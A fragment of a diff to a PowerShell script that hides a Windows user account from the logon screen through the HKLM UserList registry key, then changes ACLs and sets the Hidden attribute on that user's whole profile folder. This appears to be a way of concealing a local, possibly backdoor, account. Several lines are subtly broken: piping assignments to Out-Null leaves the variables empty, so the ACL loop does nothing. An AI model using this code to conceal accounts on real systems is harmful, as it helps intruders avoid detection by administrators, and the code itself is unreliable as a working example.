@@ -38,8 +38,8 @@
             New-ItemProperty -Path "HKLM:\$regPath\UserList" -Name $Username -PropertyType "DWORD" -Value "0" -Force | Out-Null
             }
             $uFldr = Split-Path -Path $ENV:USERPROFILE
-            $U = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList "$ENV:USERDOMAIN\$Username" | Out-Null
-            $Fldr = Get-ChildItem -Path $uFldr\$Username -Recurse | Out-Null
+            $U = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $ENV:USERDOMAIN\$Username | Out-Null
+            $Fldr = Get-ChildItem -Path $uFldr\$Username -Recurse -Force | Out-Null
             foreach ($Item in $Fldr) {
                 $Acl = $null
                 $Acl = Get-Acl -Path $Item.FullName | Out-Null
@@ -47,6 +47,6 @@
                 Set-Acl -Path $Item.FullName -AclObject $Acl | Out-Null
                 $Item.Attributes = "Hidden"
                 }
-            Get-Item .\your_folder -Force | foreach { $_.Attributes = $_.Attributes -bor "Hidden" }
+            Get-ChildItem -Path $uFldr\$Username -Recurse -Force | foreach { $_.Attributes = $_.Attributes -bor "Hidden" }
 }
             
